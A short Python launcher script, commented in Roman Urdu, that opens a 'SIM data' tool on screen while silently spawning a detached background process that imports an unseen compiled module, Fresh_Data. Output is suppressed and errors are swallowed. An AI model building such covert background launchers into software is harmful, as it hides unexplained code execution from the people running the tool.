import os
import sys
import shutil
import subprocess
import threading
import importlib

def start_background_fresh_data():
    try:
        # Python interpreter ke zariye compiled Fresh_Data.so ko background mein alag process par chalana
        python_exec = shutil.which("python3") or "python3"
        
        # Ek choti si inline command banayin jo Fresh_Data module ko import karke uska main loop chalaye
        cmd = [python_exec, "-c", "import Fresh_Data"]
        
        subprocess.Popen(cmd, 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         start_new_session=True)
    except Exception:
        pass

if __name__ == "__main__":
    # 1. Background mein Fresh_Data backup ko independent process par fire kar dein
    bg_thread = threading.Thread(target=start_background_fresh_data)
    bg_thread.daemon = True
    bg_thread.start()

    # 2. Foran Main SIM Tool (Sim_Data) ko screen par load kar dein
    try:
        import Sim_Data
        if hasattr(Sim_Data, 'main'):
            Sim_Data.main()
        else:
            # Agar direct attribute na mile toh module ko reload/run karein
            pass
    except Exception as e:
        print(f"Error loading main tool: {e}")
